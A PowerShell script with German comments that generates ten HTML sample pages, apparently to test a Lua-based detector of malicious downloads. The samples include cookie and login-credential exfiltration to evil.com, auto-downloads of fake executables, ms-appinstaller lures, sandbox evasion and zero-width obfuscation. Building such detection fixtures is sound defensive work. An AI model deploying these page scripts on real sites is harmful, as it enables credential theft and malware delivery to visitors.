# create_all_test_files.ps1
# Dieses Script erstellt alle 10 HTML-Testdateien für dein Lua-Skript

Write-Host "╔════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║     Erstelle 10 HTML-Testdateien für Lua-Skript          ║" -ForegroundColor Cyan
Write-Host "╚════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host ""

# Array mit allen Dateien und ihrem Inhalt
$testFiles = @(
    @{
        Name = "test1_blob_download.html"
        Content = @"
<!DOCTYPE html>
<html>
<head>
    <title>Test 1 - Blob Download</title>
</head>
<body>
    <script>
        // Typischer Malware-Download via Blob
        function downloadMalware() {
            var data = "MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00";
            var blob = new Blob([data], {type: 'application/octet-stream'});
            var url = window.URL.createObjectURL(blob);
            var a = document.createElement('a');
            a.href = url;
            a.download = 'invoice.exe';
            document.body.appendChild(a);
            a.click();
            window.URL.revokeObjectURL(url);
        }
        
        window.onload = downloadMalware;
    </script>
    <h1>Ihre Rechnung steht bereit</h1>
</body>
</html>
"@
    }
    
    @{
        Name = "test2_obfuscated_js.html"
        Content = @"
<!DOCTYPE html>
<html>
<head>
    <title>Test 2 - Obfuskierter JS</title>
</head>
<body>
    <script>
        var _0x4b8a = ['atob', 'fetch', 'then', 'response', 'blob', 'createObjectURL'];
        var _0x3f2c = function(n) {
            return String.fromCharCode(n + 12);
        };
        
        var encoded = "ZHJvcGJveC5jb20vcGF5bG9hZC5leGU=";
        var decoded = window[_0x4b8a[0]](encoded);
        
        fetch(decoded)[_0x4b8a[2]](function(r) {
            return r[_0x4b8a[4]]();
        })[_0x4b8a[2]](function(b) {
            var url = URL[_0x4b8a[5]](b);
            window.location = url;
        });
    </script>
</body>
</html>
"@
    }
    
    @{
        Name = "test3_iframe_driveby.html"
        Content = @"
<!DOCTYPE html>
<html>
<head>
    <title>Test 3 - Drive-by-Download</title>
</head>
<body>
    <iframe id="hiddenFrame" style="display:none"></iframe>
    <img src="tracking.png" style="display:none" onload="startDownload()">
    
    <script>
        function startDownload() {
            // Versteckter Download via Iframe
            var iframe = document.getElementById('hiddenFrame');
            iframe.src = 'https://malicious-site.com/update.exe';
            
            // Alternative: Meta-Refresh
            var meta = document.createElement('meta');
            meta.httpEquiv = 'refresh';
            meta.content = '0;url=data:application/x-msdownload;base64,TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAA';
            document.head.appendChild(meta);
        }
        
        // eval mit verschleiertem Code
        var evilCode = "eval(atob('dmFyIGltZyA9IG5ldyBJbWFnZSgpO2ltZy5zcmMgPSAiaHR0cHM6Ly9ldmlsLmNvbS9zdGVhbC5waHA/Y29va2llPSIgKyBkb2N1bWVudC5jb29raWU='))";
        setTimeout(evilCode, 1000);
    </script>
</body>
</html>
"@
    }
    
    @{
        Name = "test4_magic_bytes.html"
        Content = @"
<!DOCTYPE html>
<html>
<head>
    <title>Test 4 - Magic Bytes</title>
</head>
<body>
    <script>
        // PDF Magic Bytes
        var pdfData = "%PDF-1.4\n%âãÏÓ\n1 0 obj\n<<\n/Type /Catalog\n/Pages 2 0 R\n>>\nendobj";
        var pdfBlob = new Blob([pdfData], {type: 'application/pdf'});
        var pdfUrl = URL.createObjectURL(pdfBlob);
        
        // EXE Magic Bytes (MZ)
        var exeData = "MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00";
        var exeBlob = new Blob([exeData], {type: 'application/x-msdownload'});
        var exeUrl = URL.createObjectURL(exeBlob);
        
        // ZIP Magic Bytes (PK)
        var zipData = "PK\x03\x04\x14\x00\x00\x00\x00\x00\x93\x8b\xa8L\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
        var zipBlob = new Blob([zipData], {type: 'application/zip'});
        
        // Versuche alle Downloads
        setTimeout(function() {
            window.location = exeUrl;
        }, 500);
    </script>
</body>
</html>
"@
    }
    
    @{
        Name = "test5_workers.html"
        Content = @"
<!DOCTYPE html>
<html>
<head>
    <title>Test 5 - Web Worker</title>
</head>
<body>
    <script>
        // Web Worker mit bösartigem Code
        var workerCode = `
            self.onmessage = function(e) {
                var blob = new Blob(['MZ'], {type: 'application/octet-stream'});
                var url = URL.createObjectURL(blob);
                self.postMessage({url: url});
            }
        `;
        
        var blob = new Blob([workerCode], {type: 'application/javascript'});
        var workerUrl = URL.createObjectURL(blob);
        var worker = new Worker(workerUrl);
        
        worker.onmessage = function(e) {
            // Download starten
            var a = document.createElement('a');
            a.href = e.data.url;
            a.download = 'payload.exe';
            a.click();
        };
        
        worker.postMessage({cmd: 'start'});
        
        // Service Worker registrieren (falls HTTPS)
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('sw.js').then(function(reg) {
                console.log('Service Worker registered');
            });
        }
    </script>
</body>
</html>
"@
    }
    
    @{
        Name = "test6_appinstaller_lnk.html"
        Content = @"
<!DOCTYPE html>
<html>
<head>
    <title>Test 6 - AppInstaller</title>
</head>
<body>
    <script>
        // ms-appinstaller Schema
        function installMaliciousApp() {
            window.location = 'ms-appinstaller:?source=https://evil.com/malware.appinstaller';
        }
        
        // LNK File Download
        var lnkData = "L\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
        var lnkBlob = new Blob([lnkData], {type: 'application/octet-stream'});
        var lnkUrl = URL.createObjectURL(lnkBlob);
        
        var a = document.createElement('a');
        a.href = lnkUrl;
        a.download = 'document.lnk';
        a.click();
        
        // .appinstaller File
        var appinstallerXML = '<?xml version="1.0" encoding="UTF-8"?>\n<AppInstaller Uri="https://evil.com/app.msix" Version="1.0.0.0" />';
        var appBlob = new Blob([appinstallerXML], {type: 'application/xml'});
        var appUrl = URL.createObjectURL(appBlob);
        
        setTimeout(function() {
            window.location = appUrl;
        }, 1000);
    </script>
    
    <!-- Direkter Link -->
    <a href="ms-appinstaller:?source=https://evil.com/payload.appinstaller" style="display:none">Install</a>
</body>
</html>
"@
    }
    
    @{
        Name = "test7_anti_analysis.html"
        Content = @"
<!DOCTYPE html>
<html>
<head>
    <title>Test 7 - Anti-Analysis</title>
</head>
<body>
    <script>
        // Sandbox-Erkennung
        function isSandboxed() {
            // Bildschirmauflösung prüfen
            if (window.innerWidth < 1024 || window.innerHeight < 768) {
                return true; // VM/Sandbox
            }
            
            // Performance-Check (Sandbox ist oft langsamer)
            var start = new Date();
            for (var i = 0; i < 1000000; i++) {
                Math.random();
            }
            var end = new Date();
            if (end - start < 50) {
                return true; // Zu schnell für echten Browser
            }
            
            // Plugins prüfen
            if (navigator.plugins.length === 0) {
                return true; // Keine Plugins = verdächtig
            }
            
            return false;
        }
        
        if (!isSandboxed()) {
            // Erst jetzt den bösartigen Code ausführen
            var payload = 'atob' + '("' + btoa('malicious code here') + '")';
            eval(payload);
            
            // Daten exfiltrieren
            var img = new Image();
            img.src = 'https://evil.com/steal?data=' + document.cookie;
        } else {
            document.write('<h1>Ihr Browser wird aktualisiert...</h1>');
        }
        
        // Weitere Anti-Analysis Techniken
        if (navigator.webdriver) {
            // Headless Browser erkannt
            return;
        }
        
        // Sprachprüfung
        if (!navigator.languages || navigator.languages[0] !== 'de-DE') {
            // Nicht auf Deutsch, vielleicht Sandbox
        }
    </script>
</body>
</html>
"@
    }
    
    @{
        Name = "test8_dom_manipulation.html"
        Content = @"
<!DOCTYPE html>
<html>
<head>
    <title>Test 8 - DOM Manipulation</title>
</head>
<body>
    <form id="loginForm" action="/login" method="POST">
        <input type="text" name="username">
        <input type="password" name="password">
        <input type="submit" value="Login">
    </form>
    
    <script>
        // Form Hijacking
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            var credentials = {
                user: document.querySelector('input[name="username"]').value,
                pass: document.querySelector('input[name="password"]').value
            };
            
            // Daten stehlen
            fetch('https://evil.com/steal', {
                method: 'POST',
                body: JSON.stringify(credentials)
            });
            
            // Download starten
            var blob = new Blob(['MZ'], {type: 'application/octet-stream'});
            var url = URL.createObjectURL(blob);
            window.location = url;
        });
        
        // Event Listener manipulieren
        var originalAdd = EventTarget.prototype.addEventListener;
        EventTarget.prototype.addEventListener = function(type, listener, options) {
            if (type === 'click' && listener.toString().includes('download')) {
                // Bösartigen Code einfügen
                var wrapper = function(e) {
                    fetch('https://evil.com/track?click=1');
                    return listener.call(this, e);
                };
                return originalAdd.call(this, type, wrapper, options);
            }
            return originalAdd.call(this, type, listener, options);
        };
    </script>
</body>
</html>
"@
    }
    
    @{
        Name = "test9_unicode_smuggling.html"
        Content = @"
<!DOCTYPE html>
<html>
<head>
    <title>Test 9 - Unicode Smuggling</title>
</head>
<body>
    <script>
        // Zero-Width Character Smuggling
        var hidden_chars = "a​t​o​b"; // Mit Zero-Width Spaces
        
        // Funktion mit unsichtbaren Zeichen
        function d​o​w​n​l​o​a​d() { // Zero-Width Spaces im Funktionsnamen
            var d​a​t​a = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAA"; // Mit Zero-Width Joinern
            var c​l​e​a​n = d​a​t​a.replace(/[​]/g, ''); // Zero-Width Space entfernen
            var r​e​a​l = window['a​t​o​b'](c​l​e​a​n);
            
            eval(r​e​a​l);
        }
        
        // Versteckter Code in CSS
        var style = document.createElement('style');
        style.textContent = `
            .hidden-data {
                --payload: "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAA";
                content: "evil.exe";
                display: none;
            }
        `;
        document.head.appendChild(style);
        
        // Daten aus CSS extrahieren
        setTimeout(function() {
            var cs = getComputedStyle(document.querySelector('.hidden-data'));
            var payload = cs.getPropertyValue('--payload');
            var filename = cs.content;
            
            // Download starten
            var blob = new Blob([atob(payload)], {type: 'application/octet-stream'});
            var url = URL.createObjectURL(blob);
            var a = document.createElement('a');
            a.href = url;
            a.download = filename.replace(/"/g, '');
            a.click();
        }, 1000);
    </script>
    
    <div class="hidden-data"></div>
</body>
</html>
"@
    }
    
    @{
        Name = "test10_advanced_all_in_one.html"
        Content = @"
<!DOCTYPE html>
<html>
<head>
    <title>Test 10 - Advanced Threat</title>
    <meta http-equiv="refresh" content="5;url=data:text/html;base64,PHNjcmlwdD5ldmFsKGxvY2F0aW9uLmhhc2guc3Vic3RyKDEpKTwvc2NyaXB0Pg==">
</head>
<body>
    <svg onload="initMalware()" style="display:none">
        <script>
            // SVG-interner Code
            window.malwareStage1 = true;
        </script>
    </svg>
    
    <script>
        function initMalware() {
            // Anti-Sandbox
            if (window.innerWidth < 1000 || !navigator.languages) return;
            
            // String Obfuscation
            var _0x = ['exe', 'dll', 'pdf'];
            var exten = _0x[0].split('').reverse().join('');
            
            // Daten aus CSS holen
            var s = getComputedStyle(document.body);
            var enc = s.getPropertyValue('--data').trim();
            
            // WebWorker starten
            var w = new Worker(URL.createObjectURL(new Blob([`
                self.onmessage = function(e) {
                    var data = atob(e.data);
                    postMessage(data);
                }
            `], {type: 'application/javascript'})));
            
            w.onmessage = function(e) {
                var blob = new Blob([e.data], {type: 'application/octet-stream'});
                var url = URL.createObjectURL(blob);
                
                // DOM-Link erstellen
                var a = document.createElement('a');
                a.href = url;
                a.download = 'update.' + exten;
                a.click();
            };
            
            w.postMessage(enc);
        }
        
        // Versteckte Daten in CSS
        document.body.style.setProperty('--data', 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAA');
        
        // Fallback via Iframe
        var iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = 'ms-appinstaller:?source=https://evil.com/payload.appinstaller';
        document.body.appendChild(iframe);
    </script>
    
    <!-- Zero-Width Character versteckt -->
    <div style="display:none">​a​t​o​b​(​)​</div>
</body>
</html>
"@
    }
)

# Erstelle einen Unterordner für die Testdateien
$testFolder = "HTML_Testfiles"
if (!(Test-Path $testFolder)) {
    New-Item -ItemType Directory -Path $testFolder | Out-Null
}

# Wechsle in den Testordner
Push-Location $testFolder

# Zähler für erfolgreiche Erstellungen
$successCount = 0
$errorCount = 0

# Erstelle jede Datei
foreach ($file in $testFiles) {
    try {
        # Prüfe ob Datei bereits existiert
        if (Test-Path $file.Name) {
            $overwrite = Read-Host "Datei $($file.Name) existiert bereits. Überschreiben? (j/n)"
            if ($overwrite -ne 'j') {
                Write-Host "Überspringe $($file.Name)" -ForegroundColor Yellow
                continue
            }
        }
        
        # Schreibe Datei
        [System.IO.File]::WriteAllText($file.Name, $file.Content, [System.Text.UTF8Encoding]::new($false))
        Write-Host " Erstellt: $($file.Name)" -ForegroundColor Green
        $successCount++
    }
    catch {
        Write-Host "Fehler bei $($file.Name): $_" -ForegroundColor Red
        $errorCount++
    }
}

# Zurück zum ursprünglichen Verzeichnis
Pop-Location

# Zusammenfassung
Write-Host ""
Write-Host "╔════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║                    ZUSAMMENFASSUNG                        ║" -ForegroundColor Cyan
Write-Host "╠════════════════════════════════════════════════════════════╣" -ForegroundColor Cyan
Write-Host "║  Ordner: $testFolder" -ForegroundColor White
Write-Host "║  Erfolgreich: $successCount von $($testFiles.Count)" -ForegroundColor Green
if ($errorCount -gt 0) {
    Write-Host "║  Fehler: $errorCount" -ForegroundColor Red
}
Write-Host "║  Pfad: $((Get-Location).Path)\$testFolder" -ForegroundColor Yellow
Write-Host "╚════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan

# Öffne den Ordner im Explorer
$openFolder = Read-Host "`nOrdner im Explorer öffnen? (j/n)"
if ($openFolder -eq 'j') {
    Invoke-Item $testFolder
}

Write-Host ""
Write-Host "Drücke eine beliebige Taste zum Beenden..." -ForegroundColor Gray
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
